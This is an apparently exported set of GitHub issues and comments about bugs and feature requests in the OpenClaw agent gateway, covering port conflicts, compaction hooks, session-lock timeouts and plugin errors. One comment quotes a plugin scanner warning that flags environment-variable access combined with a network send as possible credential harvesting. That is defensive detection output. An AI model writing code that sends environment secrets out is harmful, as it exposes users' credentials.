          "body": "EDIT: merged to content\n\n<details><summary>Details</summary>\n<p>\n\n## Additional findings from console logs\n\n### macOS app `portguard` feature detected Docker\n\n```\n2026-02-02 10:42:31.672 I  OpenClaw[44147:42f761d] [ai.openclaw:portguard] port sweep starting (mode=remote)\n2026-02-02 10:42:31.742 E  OpenClaw[44147:42f7603] [ai.openclaw:portguard] port 18789 was held by com.docker.backend\n2026-02-02 10:42:31.743 I  OpenClaw[44147:42f7603] [ai.openclaw:portguard] port sweep done\n```\n\n```\n2026-02-02 10:43:26.224 I  OpenClaw[44444:42f8b7c] [ai.openclaw:portguard] port sweep starting (mode=remote)\n2026-02-02 10:43:26.418 E  OpenClaw[44444:42f8b9d] [ai.openclaw:portguard] port 18789 was held by com.docker.backend\n2026-02-02 10:43:26.418 I  OpenClaw[44444:42f8b9d] [ai.openclaw:portguard] port sweep done\n```\n\n### Docker Desktop shutdown logs\n\n```\n[2026-02-02T00:47:20.218694000Z][com.docker.backend.state] sending desktop state:ExitHealthyState\n[2026-02-02T00:47:20.232079000Z][com.docker.backend.electron] shutting down electron processes\n[2026-02-02T00:47:20.232014000Z][com.docker.backend.engines] engine linux/libkrun shutdown requested\n```\n\nNo explicit `POST /app/quit` API call was found in Docker logs at this time.\n\n### Conclusion\n\nThe macOS app's `portguard` feature detects when port 18789 is held by `com.docker.backend`. When switching to \"This Mac\" mode (or possibly on app launch), the portguard appears to terminate Docker Desktop to free up the port, even when the app is configured to use remote gateway mode.\n\n**Expected behavior:** When `gateway.mode` is set to `remote`, the portguard should not attempt to take over port 18789 or terminate processes holding that port.\n\n</p>\n</details> "
        },
        {
          "id": 3875452952,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6755#issuecomment-3875452952",
          "createdAt": "2026-02-10T05:40:04Z",
          "updatedAt": "2026-02-10T05:40:04Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3881701964,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6755#issuecomment-3881701964",
          "createdAt": "2026-02-11T02:02:58Z",
          "updatedAt": "2026-02-11T02:02:58Z",
          "author": "teslamint",
          "body": "#13798 "
        }
      ]
    },
    {
      "number": 13794,
      "title": "Gateway install fails with launchctl bootstrap domain error",
      "body": "`openclaw gateway install` fails with:\n\n```\nGateway install failed: Error: launchctl bootstrap failed: Bootstrap failed: 125: Domain does not support specified action\n```\n\nObserved from:\n\n```\n~ via node24.13.0 > openclaw gateway install\n```\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13794",
      "createdAt": "2026-02-11T01:54:39Z",
      "updatedAt": "2026-02-11T02:02:38Z",
      "author": "vincentkoc",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3881701294,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13794#issuecomment-3881701294",
          "createdAt": "2026-02-11T02:02:38Z",
          "updatedAt": "2026-02-11T02:02:38Z",
          "author": "vincentkoc",
          "body": "Found the issue was in Mac OS when not logged in or set a specific user for OpenClaw to use. Updating the doctor and gateway install messaging to be much clearer https://github.com/openclaw/openclaw/pull/13795"
        }
      ]
    },
    {
      "number": 13783,
      "title": "diagnostics-otel: sanitize OTLP endpoint URL resolution (avoid false /v1 detection)",
      "body": "## Problem\nCurrent resolver treats any endpoint containing \"/v1/\" as a fully-qualified OTLP signal URL.\nFor backends like Opik (`.../api/v1/private/otel`), this prevents appending `/v1/traces|metrics|logs`, so exports go to wrong path. Discovered during testing on https://github.com/openclaw/openclaw/pull/12897 for https://github.com/openclaw/openclaw/issues/3201.\n\n## Current Behavior\n- Endpoint: `https://www.comet.com/opik/api/v1/private/otel`\n- Resolver sees `/v1/` and returns it unchanged.\n- Trace exporter posts to `/api/v1/private/otel` instead of `/api/v1/private/otel/v1/traces`.\n\n## Expected Behavior\nBase collector-like endpoints should append signal path:\n- `/v1/traces`\n- `/v1/metrics`\n- `/v1/logs`\n\nOnly skip append when endpoint is already signal-specific.\n\n## Proposed Fix\nReplace `endpoint.includes(\"/v1/\")` logic with strict path checks:\n- if endpoint path ends with `/v1/traces|/v1/metrics|/v1/logs`, keep as-is\n- otherwise append requested signal path\n\nKeep trailing slash normalization.\nOptionally parse with `new URL()` when valid; fallback to string handling for non-URL inputs.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13783",
      "createdAt": "2026-02-11T01:38:49Z",
      "updatedAt": "2026-02-11T01:57:30Z",
      "author": "vincentkoc",
      "labels": [],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 7420,
      "title": "Feature Proposal: RLM-Style Query Delegation as Alternative to Compaction",
      "body": "## Summary\n\nPropose adding RLM-style (Recursive Language Model) query patterns as an alternative to context compaction for preserving information fidelity.\n\n## Problem\n\nContext compaction via summarization loses information. Multiple issues document this pain:\n- #5429: Lost 2 days of context to silent compaction\n- #2597: Context/state lost after unexpected compaction\n- #4520, #5224: \"Summary unavailable\" failures\n- #4121: Summarization silently fails\n\nFor agents managing complex, long-term domains (life management, multi-project coordination), this information loss compounds over time.\n\n## Proposed Solution: RLM-Style Query Delegation\n\nBased on the [Recursive Language Models paper](https://arxiv.org/abs/2512.24601) (Zhang, Kraska, Khattab - Dec 2025), instead of summarizing context, treat long content as external variables that sub-agents query on demand.\n\n### Key Insight from the Paper\n\n> \"Arbitrarily long user prompts should not be fed into the neural network directly but should instead be treated as part of the environment that the LLM is tasked to symbolically and recursively interact with.\"\n\n### How it works with OpenClaw\n\nInstead of:\n```\n[load MEMORY.md into context] → compaction → [lossy summary]\n```\n\nDo:\n```\n[keep MEMORY.md on disk] → spawn sub-agent query → [precise extraction] → discard sub-agent\n```\n\nOpenClaw already has the primitives:\n- `sessions_spawn` for sub-agent delegation\n- File system for external memory\n- Cheaper/faster models (Haiku 4.5) for retrieval tasks\n\n### Prototype Results\n\nTested with a real OpenClaw instance:\n\n| Query | File | Time | Result |\n|-------|------|------|--------|\n| Breakfast supplements | MEMORY.md | 12s | ✅ Precise extraction (14 items) |\n| Policy lookup | TOOLS.md | 7s | ✅ Exact quote retrieved |\n\n**Main session context used: 0 bytes** — sub-agents loaded the files, extracted precisely, returned results.\n\n### Model Comparison (UPDATE: Haiku 4.5 is optimal)\n\nWe tested Haiku 4.5 vs Sonnet 4.5 for retrieval tasks:\n\n| Model | Time | Quality | Relative Cost |\n|-------|------|---------|---------------|\n| **Haiku 4.5** | **9s** | ✅ Excellent | 1x |\n| Sonnet 4.5 | 19s | ✅ Excellent | ~3x |\n\n**Finding:** For simple retrieval (read file → extract answer → return), Haiku 4.5 is **2x faster** and **3x cheaper** with identical quality. Recommend Haiku for retrieval, reserving Sonnet/Opus for complex reasoning.\n\n### Trade-offs\n\n| Aspect | Compaction | RLM Pattern |\n|--------|------------|-------------|\n| Latency | Instant | ~9-15s per query |\n| Info Loss | High | Zero |\n| Cost | Lower | Higher per query (but Haiku makes it sustainable) |\n| Reliability | Degrades | Consistent |\n\n## Possible Implementation Paths\n\n1. **Pattern Documentation** — Document this as a recommended pattern in docs\n2. **Built-in Query Tool** — `memory_query(file, question)` that auto-spawns sub-agent\n3. **Hybrid Compaction** — Compaction that delegates to sub-agents instead of summarizing\n4. **Native RLM Integration** — Deeper integration with the RLM library\n\n## Related Issues\n\n- #6622, #7175, #6658: Pre-compaction hooks (complementary approach)\n- #6757: Self-compact tool (timing control)\n- #2597, #5429: Context loss bugs (this addresses root cause)\n\n## References\n\n- [Recursive Language Models Paper](https://arxiv.org/abs/2512.24601)\n- [RLM GitHub](https://github.com/alexzhang13/rlm)\n- [RLM Blogpost](https://alexzhang13.github.io/blog/2025/rlm/)\n\n---\n\nWould love feedback from maintainers on whether this approach aligns with OpenClaw's direction. Happy to contribute a PR for documentation or implementation.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7420",
      "createdAt": "2026-02-02T20:06:40Z",
      "updatedAt": "2026-02-11T01:52:20Z",
      "author": "initiator1",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3881679514,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7420#issuecomment-3881679514",
          "createdAt": "2026-02-11T01:52:20Z",
          "updatedAt": "2026-02-11T01:52:20Z",
          "author": "vincentkoc",
          "body": "See https://github.com/openclaw/openclaw/pull/12580"
        }
      ]
    },
    {
      "number": 13741,
      "title": "Gateway crashes on transient network errors (TypeError: fetch failed)",
      "body": "## Summary\n\nThe gateway process exits on transient \\TypeError: fetch failed\\ errors from Node's undici HTTP client. This makes the gateway fragile to any network blip — DNS hiccup, API timeout, CDN error — across any channel (Discord, Telegram, Anthropic API, browser control).\n\n## Root Cause\n\n\\dist/infra/unhandled-rejections.js\\ has a global \\unhandledRejection\\ handler that calls \\process.exit(1)\\ on any rejection that isn't an \\AbortError\\:\n\n\\\\\\js\nprocess.on('unhandledRejection', (reason) => {\n  const name = reason?.constructor?.name ?? '';\n  if (name === 'AbortError') {\n    console.error('[clawdbot] Suppressed AbortError (likely gateway restart):', String(reason));\n    return;\n  }\n  console.error('[clawdbot] Unhandled promise rejection:', formatUncaughtError(reason));\n  process.exit(1);  // <-- kills the daemon\n});\n\\\\\\\n\nWhen any outbound fetch call fails (network timeout, ECONNRESET, DNS failure), Node's undici throws \\TypeError: fetch failed\\. This bubbles up as an unhandled rejection and hits the handler above, which kills the entire gateway.\n\n## Impact\n\n- Gateway crashes every ~15-20 minutes during any network instability\n- All channels (Discord, Telegram, etc.) go offline\n- Scheduled tasks, active sessions, and browser control all die\n- Keepalive/scheduled task restarts help but cause session interruptions\n\n## Reproduction\n\n1. Start the gateway with active Discord + Telegram channels\n2. Introduce any network interruption (brief WiFi drop, VPN reconnect, API rate limit)\n3. Gateway crashes with:\n\\\\\\\n[clawdbot] Unhandled promise rejection: TypeError: fetch failed\n\\\\\\\n\n## Suggested Fix\n\nAdd \\TypeError: fetch failed\\ to the suppression list alongside \\AbortError\\:\n\n\\\\\\js\nif (name === 'TypeError' && String(reason).includes('fetch failed')) {\n  console.error('[clawdbot] Suppressed transient fetch error:', String(reason));\n  return;\n}\n\\\\\\\n\nIdeally, the individual subsystems (Discord client, Telegram poller, API caller) should have their own try/catch around fetch calls so these never reach the global handler. A long-running daemon should not \\process.exit(1)\\ on transient network errors.\n\n## Environment\n\n- **Clawdbot:** 2026.1.24-3\n- **Node:** v24.12.0\n- **OS:** Windows 11 (x64)\n- **Channels:** Discord + Telegram active\n\n## Workaround\n\nManually patching \\dist/infra/unhandled-rejections.js\\ to suppress the TypeError. Patch gets wiped on \\\npm update\\.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13741",
      "createdAt": "2026-02-10T23:52:26Z",
      "updatedAt": "2026-02-11T01:52:04Z",
      "author": "sunset584da",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "discord"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881678915,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13741#issuecomment-3881678915",
          "createdAt": "2026-02-11T01:52:04Z",
          "updatedAt": "2026-02-11T01:52:04Z",
          "author": "echoVic67",
          "body": "## Analysis\n\nI reviewed the current source code in `src/infra/unhandled-rejections.ts` and it appears this issue has already been fixed in the latest version.\n\nThe current implementation includes:\n\n1. **`isTransientNetworkError()` function** that checks for:\n   - All common transient network error codes (`ECONNRESET`, `ECONNREFUSED`, `ENOTFOUND`, `ETIMEDOUT`, etc.)\n   - Undici-specific codes (`UND_ERR_CONNECT_TIMEOUT`, `UND_ERR_SOCKET`, etc.)\n   - `TypeError: fetch failed` from Node's native fetch (undici)\n   - Recursive cause chain inspection\n   - `AggregateError` unwrapping\n\n2. **The `installUnhandledRejectionHandler()`** now properly handles transient network errors by logging a warning instead of calling `process.exit(1)`:\n\n```typescript\nif (isTransientNetworkError(reason)) {\n  console.warn('[openclaw] Non-fatal unhandled rejection (continuing):', formatUncaughtError(reason));\n  return;\n}\n```\n\nThis matches exactly what the issue suggested. The fix covers the `TypeError: fetch failed` case and all common network error codes.\n\n**If you're still experiencing crashes on the latest version (2026.2.9+), please reopen with updated logs.** The version mentioned in the issue (2026.1.24-3) predates this fix."
        }
      ]
    },
    {
      "number": 7175,
      "title": "Feature: Pre-compaction hook for memory preservation",
      "body": "## Problem\n\nWhen conversation context gets too long, Clawdbot compacts it automatically. If the summary generation fails (or is incomplete), critical context is lost permanently.\n\nCurrently there's no warning before compaction happens, so the agent can't proactively save important information.\n\n## Proposed Solution\n\nAdd a **pre-compaction hook** that fires before context compaction begins:\n\n1. Clawdbot detects context approaching limit\n2. Fires a hook/event: `pre-compaction` (or calls a configured script/prompt)\n3. Agent has opportunity to:\n   - Dump key decisions to files\n   - Save action items\n   - Update memory/context files\n   - Confirm readiness\n4. Compaction proceeds\n5. Critical context is preserved in external files\n\n## Alternatives Considered\n\n- **Manual discipline:** Agent writes to memory files in real-time (current workaround, error-prone)\n- **More frequent scheduled syncs:** Still can miss fast-moving conversations\n- **Larger context windows:** Expensive, doesn't solve the fundamental problem\n\n## Use Case\n\nLate-night planning session with important decisions. Scheduled memory sync ran at 21:00, conversation continued until 23:00 with key decisions. Context compacted overnight, summary failed, decisions lost.\n\nWith pre-compaction hook: Agent would have saved the decisions before compaction.\n\n## Additional Context\n\nThis would make Clawdbot agents significantly more reliable for long-running conversations and reduce the \"amnesia\" problem that frustrates users.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7175",
      "createdAt": "2026-02-02T14:03:36Z",
      "updatedAt": "2026-02-11T01:51:57Z",
      "author": "00ainick-cmd",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3853528242,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7175#issuecomment-3853528242",
          "createdAt": "2026-02-05T13:05:41Z",
          "updatedAt": "2026-02-05T13:05:41Z",
          "author": "OmarNassar1127",
          "body": "Related: #9611 requests a post-compaction hook (to reload memory after compaction). Combined with this pre-compaction hook, it would provide full lifecycle coverage for preserving and restoring agent memory across compaction events."
        },
        {
          "id": 3855070667,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7175#issuecomment-3855070667",
          "createdAt": "2026-02-05T17:23:59Z",
          "updatedAt": "2026-02-11T01:51:57Z",
          "author": "vincentkoc",
          "body": "@00ainick-cmd @OmarNassar1127 addressed in PR [#12580](https://github.com/openclaw/openclaw/pull/12580). added `agent:flush` event before memory flush as well as explicit `session:compact` and related events."
        }
      ]
    },
    {
      "number": 9611,
      "title": "Feature request: session:compact hook event",
      "body": "## Summary\n\nRequest a dedicated `session:compact` or `session:compacted` hook event that fires when a session is compacted/summarized.\n\n## Use Case\n\nWhen a session is compacted, the agent loses specific memories and operational patterns learned during the session. I want to inject a reminder to re-read key files (like `learned-patterns.md`, `current-focus.md`) after compaction so that important knowledge survives.\n\n## Current Workaround\n\nI've built a workaround that:\n1. Hooks into `agent:bootstrap`\n2. Detects compaction by looking for markers like \"session is being continued\" or \"ran out of context\" in recent messages\n3. Injects a reminder if detected\n\nThis works but is fragile — it depends on specific phrasing in compaction summaries.\n\n## Requested Event\n\nA proper `session:compact` event that fires once when compaction completes, with context like:\n- `sessionId` / `sessionKey`\n- `summaryLength` or `tokensRetained`\n- Ability to inject messages into the post-compaction context\n\nThis would enable reliable post-compaction memory refresh without relying on text detection.\n\n## Related\n\nThe hooks documentation shows `session:start` and `session:end` as \"planned events\" — this would fit naturally alongside those.",
      "state": "open",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611",
      "createdAt": "2026-02-05T13:03:30Z",
      "updatedAt": "2026-02-11T01:51:11Z",
      "author": "OmarNassar1127",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3853527805,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611#issuecomment-3853527805",
          "createdAt": "2026-02-05T13:05:35Z",
          "updatedAt": "2026-02-05T13:05:35Z",
          "author": "OmarNassar1127",
          "body": "Related to #7175 (Pre-compaction hook for memory preservation). That issue requests a pre-compaction hook, this one requests a post-compaction hook. Together they would provide complete lifecycle coverage for memory management during compaction events."
        },
        {
          "id": 3855073227,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611#issuecomment-3855073227",
          "createdAt": "2026-02-05T17:24:34Z",
          "updatedAt": "2026-02-11T01:51:11Z",
          "author": "vincentkoc",
          "body": "@OmarNassar1127 see https://github.com/openclaw/openclaw/pull/12580"
        },
        {
          "id": 3867023639,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611#issuecomment-3867023639",
          "createdAt": "2026-02-08T11:21:02Z",
          "updatedAt": "2026-02-08T11:21:02Z",
          "author": "Glucksberg",
          "body": "📋 **Duplicate triage note:** The following open issue appears to report the same problem:\n- #11617 — Add session:pre-compact event hook\n\nConsider consolidating discussion here."
        },
        {
          "id": 3881574269,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611#issuecomment-3881574269",
          "createdAt": "2026-02-11T01:07:39Z",
          "updatedAt": "2026-02-11T01:07:39Z",
          "author": "murilo",
          "body": "Hi everyone! 👋\n\nI came across this issue while working on memory persistence solutions for OpenClaw. I see that #11617 was marked as a duplicate of this discussion — happy to join forces here instead!\n\n### Quick Context\n\nI've prepared a focused implementation of the `session:pre-compact` hook that addresses the use case discussed here. After reviewing the closed PR #9761, I made sure to avoid the issues that led to its rejection:\n\n**Key Differences from PR #9761:**\n- ✅ Small scope: Only adds `session:pre-compact` event (not 10+ hooks)\n- ✅ Non-blocking: Compaction continues even if hook fails\n- ✅ Practical example: Includes a working memory-save hook\n- ✅ Well-tested: 20 test scenarios covering edge cases\n- ✅ ~500 lines total: Easy to review\n\n### Why This Matters\n\nWithout this hook, users lose context when compaction happens — no way to save full conversation history, agents forget important decisions, long-running sessions lose continuity.\n\n### What I'm Looking For\n\nBefore submitting a PR, I'd love feedback:\n1. **Hook naming:** `session:pre-compact`, `session:compact:before`, or something else?\n2. **Payload structure:** Is the current payload sufficient, or should we include more metadata?\n3. **Error handling:** Currently compaction continues if hook fails — right approach?\n4. **Scope:** Should we also add `session:post-compact` in the same PR, or keep it even more focused?\n\n**Status:**\n- ✅ Implementation complete (~500 lines)\n- ✅ Test suite ready (20 tests)\n- ✅ Example hook included\n- ⏸️ Awaiting maintainer guidance before submitting PR\n\nLooking forward to your thoughts!"
        },
        {
          "id": 3881676569,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9611#issuecomment-3881676569",
          "createdAt": "2026-02-11T01:51:00Z",
          "updatedAt": "2026-02-11T01:51:00Z",
          "author": "vincentkoc",
          "body": "This is already resolved and passing on https://github.com/openclaw/openclaw/pull/12580"
        }
      ]
    },
    {
      "number": 13790,
      "title": "MEDIA: tag in agent reply not delivered as attachment on Telegram",
      "body": "## Description\n\nWhen the `tts` tool returns a `MEDIA:/path/to/file.opus` line (with `[[audio_as_voice]]`), including it in the agent's reply text doesn't result in Telegram receiving a voice message. Instead, the literal `MEDIA:/path` string is sent as text.\n\n## Expected behavior\n\nOpenClaw should parse `MEDIA:<path>` on its own line in the agent reply and deliver it as an attachment (voice bubble for opus/ogg on Telegram).\n\n## Workaround\n\nUsing the `message` tool directly with `media` and `asVoice: true` works correctly and delivers a proper voice bubble.\n\n## Steps to reproduce\n\n1. Agent calls `tts` tool, gets back `MEDIA:/tmp/tts-xxx/voice-xxx.opus`\n2. Agent includes the MEDIA line in its reply text\n3. Telegram receives the literal path string instead of an audio attachment\n\n## Environment\n\n- OpenClaw via npm (latest as of Feb 10 2026)\n- Channel: Telegram\n- OS: WSL2 (Linux 6.6.87.2-microsoft-standard-WSL2)\n- TTS provider: Edge TTS (keyless)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13790",
      "createdAt": "2026-02-11T01:47:25Z",
      "updatedAt": "2026-02-11T01:47:25Z",
      "author": "explainanalyze",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 10287,
      "title": "[Bug]: Config warnings:\\n- plugins.entries.feishu: plugin feishu: duplicate plugin id detected; later plugin may be overridden (/usr/local/lib/node_modules/openclaw/extensions/feishu/index.ts)",
      "body": "## Summary\n\nWhat went wrong?\nalways :Config warnings:\\n- plugins.entries.feishu: plugin feishu: duplicate plugin id detected; later plugin may be overridden (/usr/local/lib/node_modules/openclaw/extensions/feishu/index.ts)\n## Steps to reproduce\n\n1.\n2.\n3.\n\n## Expected behavior\n\nWhat did you expect to happen?\n\n## Actual behavior\n\nWhat actually happened?\n\n## Environment\n\n- Clawdbot version:\n- OS:\n- Install method (pnpm/npx/docker/etc):\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10287",
      "createdAt": "2026-02-06T09:16:37Z",
      "updatedAt": "2026-02-11T01:47:09Z",
      "author": "gengi98",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3865958076,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10287#issuecomment-3865958076",
          "createdAt": "2026-02-08T02:15:59Z",
          "updatedAt": "2026-02-08T02:15:59Z",
          "author": "dellemcryan",
          "body": "same issue : I installed an unofficial version before. but now the official one is available, how to fix this ?   feishu"
        },
        {
          "id": 3866230159,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10287#issuecomment-3866230159",
          "createdAt": "2026-02-08T05:50:31Z",
          "updatedAt": "2026-02-08T05:50:31Z",
          "author": "905784316",
          "body": "I have the same issue. How to uninstall old feishu plugin?"
        },
        {
          "id": 3881667065,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10287#issuecomment-3881667065",
          "createdAt": "2026-02-11T01:47:09Z",
          "updatedAt": "2026-02-11T01:47:09Z",
          "author": "lpdswing",
          "body": "save issue, \n\nDownloading @openclaw/feishu…\nExtracting /tmp/openclaw-npm-pack-KQTsjv/openclaw-feishu-2026.2.9.tgz…\nWARNING: Plugin \"feishu\" contains dangerous code patterns: Environment variable access combined with network send — possible credential harvesting (/tmp/openclaw-plugin-U5xz2r/extract/package/src/media.ts:488)\n│\n◇  Plugin install ─────────────────────────────────────────────╮\n│                                                              │\n│  Failed to install @openclaw/feishu: plugin already exists:  │\n│  /root/.openclaw/extensions/feishu (delete it first)         │\n│                                                              │\n├──────────────────────────────────────────────────────────────╯\nPlugin install failed: plugin already exists: /root/.openclaw/extensions/feishu (delete it first)"
        }
      ]
    },
    {
      "number": 13436,
      "title": "Session store lock timeouts under concurrent multi-channel load",
      "body": "## Description\n\nThe file-based session store lock (`sessions.json.lock`) frequently times out when multiple channels (Telegram, iMessage, heartbeat) attempt concurrent access. This causes handler failures and dropped messages/heartbeats.\n\n## Error\n\n```\nError: timeout acquiring session store lock: ~/.openclaw/agents/default/sessions/sessions.json.lock\n```\n\n## Reproduction\n\nThis occurs naturally when multiple input channels are active simultaneously:\n- Heartbeat fires while a Telegram message is being processed\n- Multiple iMessage messages arrive in rapid succession\n- Any combination of concurrent channel activity\n\n## Observed Frequency\n\nFrom logs over a 24-hour period (Feb 9-10, 2026):\n\n| Time | Source | Failures |\n|------|--------|----------|\n| Feb 9, 17:48 UTC | iMessage | 12 failures in ~10 seconds |\n| Feb 10, 01:28-07:40 UTC | Heartbeat + Telegram | ~15 failures spread across 6 hours |\n| Feb 10, 14:08-14:14 UTC | Heartbeat + Telegram | 3 failures in 6 minutes |\n\n## Impact\n\n- **Dropped heartbeats**: Memory extraction / periodic tasks silently fail\n- **Dropped messages**: User messages via Telegram/iMessage get lost with no retry\n- **iMessage flood vulnerability**: Burst of messages causes cascade of lock failures\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- macOS (Darwin arm64)\n- Active channels: Telegram, iMessage, heartbeat (15-min interval)\n- Node.js v25.5.0\n\n## Suggestion\n\nConsider replacing the file-based JSON lock with a more concurrent-friendly approach:\n- In-memory lock with queue (serialize access within the process)\n- SQLite-backed session store (handles concurrent reads/writes natively)\n- Retry with backoff before failing (currently seems to just timeout)\n- At minimum, a retry mechanism so messages are not silently dropped\n\n## Priority\n\n**High** — This causes silent message loss and heartbeat failures in normal multi-channel operation.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13436",
      "createdAt": "2026-02-10T14:23:45Z",
      "updatedAt": "2026-02-11T01:46:09Z",
      "author": "realsamrat",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3878915408,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13436#issuecomment-3878915408",
          "createdAt": "2026-02-10T16:05:00Z",
          "updatedAt": "2026-02-10T16:05:00Z",
          "author": "leftspin",
          "body": "## Repro: Single zombie process holds session lock for 2+ hours, cascading failure across all lanes\n\n**Environment:** OpenClaw gateway on macOS (arm64), Clawline plugin, multi-channel (Clawline + cron jobs), model: claude-opus-4-6 with codex fallbacks.\n\n### What happened\n\nA single process (pid 66664) acquired a session file lock and held it for **2+ hours** (03:14–05:26 UTC, Feb 10 2026). During that time, **every** system that needed to write to the session was blocked:\n\n### Cascade\n\n1. **Cron jobs** (isolated agentTurn → sessions_send): all timed out on lock acquire (10s timeout), every 10 minutes for 7 hours straight\n2. **Alert delivery** (/alert HTTP endpoint): alerts were **received** (HTTP 200, logged `alert_request_complete`) but `announce queue drain` failed because waking the session hit the same lock\n3. **Embedded agent runs**: all three fallback models failed — two on lock timeout, one on OAuth refresh\n4. **Both lane targets blocked**: `lane=main` and `lane=session:agent:main:clawline:flynn:main` showed identical lock errors\n\n### Error signatures\n\n```\nsession file locked (timeout 10000ms): pid=66664 .../session_81b5b77b-...jsonl.lock\n```\n\n```\nannounce queue drain failed for agent:main:clawline:flynn:main: Error: gateway timeout after 60000ms\n```\n\n```\nEmbedded agent failed before reply: All models failed (3): \n  openai-codex/gpt-5.3-codex: session file locked (timeout 10000ms) (timeout)\n  openai-codex/gpt-5.2-codex: session file locked (timeout 10000ms) (timeout)  \n  anthropic/claude-opus-4-6: OAuth token refresh failed (auth)\n```\n\n### Root cause (likely)\n\nThe lock-holding process appears to have been a long-running LLM call (possibly compaction) that never released the lock. The lock has no TTL or staleness check, so it persisted until the process eventually died.\n\n### Workaround\n\nManually deleting the `.lock` file restores service immediately. But this requires someone to notice the failure first — which didn't happen overnight, resulting in 7 hours of total cron/alert blackout.\n\n### Suggestion\n\nA max-TTL or staleness check on session file locks (e.g., if lock holder pid is dead or lock age exceeds N minutes, force-release) would prevent a single stuck process from cascading into a full system outage."
        },
        {
          "id": 3881664906,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13436#issuecomment-3881664906",
          "createdAt": "2026-02-11T01:46:09Z",
          "updatedAt": "2026-02-11T01:46:09Z",
          "author": "leonnardo",
          "body": "I'm experiencing a related issue with cron job announce delivery failing when the main session is active.\n\n**Scenario:**\n- Isolated cron job with `delivery.mode: announce` and `wakeMode: next-heartbeat`\n- Job executes successfully (status `ok`, summary generated)\n- But delivery fails if the user is actively chatting in the main session\n\n**Error:**\n```\nSubagent announce failed: session file locked (timeout 10000ms)\n[cron:b66facb0-...] cron announce delivery failed\n```\n\n**Observations:**\n- Same job delivers fine when main session is idle\n- Manual `cron run` while chatting → always fails\n- Scheduled runs at times when I'm not chatting → work fine\n\n**Expected behavior:**\nAccording to the docs, announce delivery should go \"directly via the outbound channel adapters\" without spinning up the main agent. But it seems to still require access to the main session file, which fails when locked.\n\n**Environment:**\n- OpenClaw 2026.2.9\n- Ubuntu (Linux x64)\n- Telegram channel\n- Cron jobs targeting a Telegram topic (`-100...:topic:197`)\n\nThis is the same lock contention issue, but specifically affecting cron announce delivery reliability."
        }
      ]
    },
    {
      "number": 13788,
      "title": "Feishu plugin: Duplicate messages cause duplicate responses",
      "body": "## Bug Description\n\nThe Feishu plugin delivers the same message multiple times, causing the agent to respond multiple times.\n\n## Evidence\n\nWhen sending a message to the agent, the session log shows the same message_id appearing 4-5 times:\n\n```\nMessage ID: om_x100b5788a8b608a0b38fd972d8c0d9e\nCount in session log: 4 times\n```\n\nEach delivery triggers a new agent response, resulting in duplicate replies.\n\n## Timeline from Session Log\n\n| Timestamp | Event |\n|-----------|-------|\n| 00:08:18 | Original message received |\n| 00:09:17 | Message queued again (while agent busy) |\n| 00:34:19 | Message re-queued |\n| 00:34:31 | Message re-queued |\n| 00:34:47 | Message re-queued |\n\n## Root Cause\n\nThe Feishu WebSocket appears to re-deliver messages that weren't acknowledged quickly enough while the agent is processing. Each re-delivery triggers a new response.\n\n## Suggested Fix\n\nAdd message deduplication to the Feishu plugin's message handler:\n\n```typescript\n// In monitor.ts\nconst processedMessages = new Set<string>();\n\neventDispatcher.register({\n  \"im.message.receive_v1\": 